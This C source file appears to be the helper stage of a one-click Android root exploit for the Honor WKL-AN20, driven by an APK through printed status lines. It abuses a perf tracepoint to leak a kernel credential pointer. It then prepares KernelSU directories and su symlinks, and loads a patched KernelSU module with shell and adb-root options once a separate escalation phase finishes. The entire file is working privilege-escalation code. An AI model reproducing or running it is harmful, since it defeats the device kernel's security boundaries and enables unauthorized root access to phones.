/*
 * One-click APK credential helper for Honor WKL-AN20.
 *
 * Output contract consumed by the APK:
 *   HIT pid=<pid> ptr=<cred>
 *   LAYOUT_DONE
 *   TARGET_FINIT_MODULE ...
 *   MODULE_LOADED
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <grp.h>
#include <linux/perf_event.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <unistd.h>

#define PERF_PAGES 8
#define CAP_TRACEPOINT_ID 681

static int perf_event_open_one(struct perf_event_attr *attr, pid_t pid,
                               int cpu, int group_fd, unsigned long flags)
{
    return (int)syscall(SYS_perf_event_open, attr, pid, cpu, group_fd, flags);
}

static uint32_t read_u32(const char **p)
{
    uint32_t value;

    memcpy(&value, *p, sizeof(value));
    *p += sizeof(value);
    return value;
}

static uint64_t read_u64(const char **p)
{
    uint64_t value;

    memcpy(&value, *p, sizeof(value));
    *p += sizeof(value);
    return value;
}

static int parse_cap_sample(const unsigned char *record, uint64_t *cred_out)
{
    const struct perf_event_header *header =
        (const struct perf_event_header *)record;
    const char *p = (const char *)record + sizeof(*header);
    const char *end = (const char *)record + header->size;
    uint32_t raw_size;
    uint16_t common_type;
    uint64_t cred;

    if (header->type != PERF_RECORD_SAMPLE || p + 20 > end)
        return 0;
    (void)read_u32(&p);
    (void)read_u32(&p);
    (void)read_u64(&p);
    raw_size = read_u32(&p);
    if (p + raw_size > end || raw_size < 40)
        return 0;
    memcpy(&common_type, p, sizeof(common_type));
    if (common_type != CAP_TRACEPOINT_ID)
        return 0;
    memcpy(&cred, p + 8, sizeof(cred));
    if (cred < 0xffffff8000000000ULL)
        return 0;
    *cred_out = cred;
    return 1;
}

static int discover_cred(uint64_t *cred_out)
{
    struct perf_event_attr attr;
    int fd;
    long page_size;
    size_t map_size;
    struct perf_event_mmap_page *meta;

    memset(&attr, 0, sizeof(attr));
    attr.type = PERF_TYPE_TRACEPOINT;
    attr.size = sizeof(attr);
    attr.config = CAP_TRACEPOINT_ID;
    attr.sample_period = 1;
    attr.sample_type =
        PERF_SAMPLE_TID | PERF_SAMPLE_TIME | PERF_SAMPLE_RAW;
    attr.wakeup_events = 1;
    attr.disabled = 1;
    attr.exclude_hv = 1;

    fd = perf_event_open_one(&attr, 0, -1, -1, 0);
    if (fd < 0) {
        printf("ERR perf_event_open errno=%d(%s)\n", errno,
               strerror(errno));
        return -1;
    }

    page_size = sysconf(_SC_PAGESIZE);
    map_size = (size_t)(PERF_PAGES + 1) * (size_t)page_size;
    meta = mmap(NULL, map_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (meta == MAP_FAILED) {
        close(fd);
        return -1;
    }

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    for (int i = 0; i < 32; i++) {
        (void)setresgid(0, 0, 0);
        (void)setresuid(0, 0, 0);
        (void)setgroups(0, NULL);
        (void)syscall(SYS_unshare, CLONE_NEWNS);
        (void)syscall(SYS_keyctl, 0, 0, 1, 0, 0);
        sched_yield();
    }
    usleep(100000);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
    __sync_synchronize();

    uint64_t head = meta->data_head;
    uint64_t tail = meta->data_tail;
    size_t data_offset =
        meta->data_offset ? meta->data_offset : (size_t)page_size;
    size_t data_size = meta->data_size
                           ? meta->data_size
                           : (size_t)PERF_PAGES * (size_t)page_size;
    unsigned char *data = (unsigned char *)meta + data_offset;
    uint64_t cred = 0;
    while (tail < head) {
        size_t offset = (size_t)(tail % data_size);
        struct perf_event_header header;

        memcpy(&header, data + offset, sizeof(header));
        if (header.size < sizeof(header) ||
            offset + header.size > data_size)
            break;
        uint64_t candidate = 0;
        if (parse_cap_sample(data + offset, &candidate))
            cred = candidate;
        tail += header.size;
    }

    meta->data_tail = tail;
    munmap(meta, map_size);
    close(fd);
    if (!cred)
        return -1;
    *cred_out = cred;
    return 0;
}

static int module_is_loaded(void)
{
    FILE *modules = fopen("/proc/modules", "re");
    char line[512];

    if (!modules)
        return 0;
    while (fgets(line, sizeof(line), modules)) {
        if (strncmp(line, "kernelsu ", 9) == 0) {
            fclose(modules);
            return 1;
        }
    }
    fclose(modules);
    return 0;
}

static int prepare_layout(void)
{
    if (mkdir("/data/adb", 0700) != 0 && errno != EEXIST)
        return -1;
    if (mkdir("/data/adb/ksu", 0700) != 0 && errno != EEXIST)
        return -1;
    if (mkdir("/data/adb/ksu/bin", 0755) != 0 && errno != EEXIST)
        return -1;
    if (mkdir("/data/adb/modules", 0755) != 0 && errno != EEXIST)
        return -1;
    (void)symlink("/data/adb/ksud", "/data/adb/ksu/bin/su");
    (void)symlink("/data/adb/ksud", "/data/adb/ksu/bin/ksud");
    return 0;
}

static uint64_t read_cap_effective(void)
{
    FILE *status = fopen("/proc/self/status", "re");
    char line[256];
    uint64_t value = 0;
    unsigned long long parsed = 0;

    if (!status)
        return 0;
    while (fgets(line, sizeof(line), status)) {
        if (sscanf(line, "CapEff: %llx", &parsed) == 1) {
            value = (uint64_t)parsed;
            break;
        }
    }
    fclose(status);
    return value;
}

static int phase2_done(void)
{
    return access("/data/local/tmp/honor/PHASE2_DONE", F_OK) == 0;
}

static int load_kernel_module(void)
{
    for (int attempt = 1; attempt <= 15; attempt++) {
        if (module_is_loaded())
            return 0;
        uint64_t cap_eff = read_cap_effective();
        int fd = open("/data/local/tmp/honor/ksu-patched.ko", O_RDONLY);
        if (fd < 0) {
            printf("TARGET_FINIT_MODULE open errno=%d(%s)\n",
                   errno, strerror(errno));
            return -1;
        }
        errno = 0;
        long rc = syscall(SYS_finit_module, fd,
                          "allow_shell=1 force_feature=adb_root:1", 0);
        int error = errno;
        close(fd);
        printf("TARGET_FINIT_MODULE attempt=%d CapEff=%#llx rc=%ld errno=%d(%s)\n",
               attempt, (unsigned long long)cap_eff, rc, error,
               strerror(error));
        if (rc == 0 || module_is_loaded())
            return 0;
        sleep(1);
    }
    return -1;
}

int main(void)
{
    uint64_t cred;

    setvbuf(stdout, NULL, _IOLBF, 0);
    if (discover_cred(&cred) != 0) {
        printf("NO HIT\n");
        return 2;
    }

    printf("HIT pid=%d ptr=%#llx bit16=%d\n",
           (int)getpid(), (unsigned long long)cred,
           (int)(((cred + 0x40) >> 16) & 1));

    int layout_done = 0;
    int module_announced = 0;
    int module_loaded = 0;
    for (;;) {
        if (!layout_done && prepare_layout() == 0) {
            layout_done = 1;
            printf("LAYOUT_DONE\n");
        }
        if (layout_done && !module_loaded && phase2_done()) {
            module_loaded = load_kernel_module() == 0;
            if (!module_loaded) {
                printf("TARGET_FINIT_MODULE_FAILED\n");
                return 4;
            }
        }
        if (module_loaded && !module_announced) {
            module_announced = 1;
            printf("MODULE_LOADED\n");
            return 0;
        }
        usleep(100000);
    }
}
